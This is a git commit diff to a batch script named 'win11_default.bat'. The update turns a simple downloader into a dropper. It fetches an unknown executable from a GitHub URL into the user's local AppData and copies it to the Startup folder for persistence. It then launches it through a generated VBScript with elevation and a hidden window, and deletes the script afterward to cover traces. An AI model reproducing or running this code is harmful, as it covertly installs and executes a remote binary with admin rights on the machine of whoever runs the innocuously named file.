7b4c96dcf4bb9461482f6e987ee030c841d96501
optolab <sloneeddie36@gmail.com>
2025-01-12 13:14:28 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,7 +1,36 @@
 @echo off
-set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
-set file=%USERPROFILE%\Downloads\fbf12e4f.exe
-echo Downloading file...
-wget --progress=bar -O "%file%" "%url%"
-echo Download complete. File saved to %file%
-pause
+
+:: Define Parameters
+set filename=fbf12e4f.exe
+set download_link=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
+set startup=Y
+set elevation=Y
+set invisibility=Y
+set mutex=Y
+
+:: Download file if not already present
+if not exist "%localappdata%\%filename%" (
+    powershell -command wget "%download_link%" -OutFile "%localappdata%\%filename%"
+)
+
+:: Handle Startup (copy to startup folder)
+if %startup%==Y (
+    copy "%localappdata%\%filename%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+)
+
+:: Handle Elevation (run as admin)
+if %elevation%==Y (
+    set M=runas
+)
+
+:: Handle Invisibility (run without a window)
+if %invisibility%==Y (
+    set N=0
+)
+
+:: Launch the Application
+echo CreateObject("Shell.Application").ShellExecute "%localappdata%\%filename%","",","%M%","%N%" > "%filename%.vbs"
+"%filename%.vbs"
+timeout /t 1 /nobreak
+del "%filename%"
+del "%filename%.vbs"
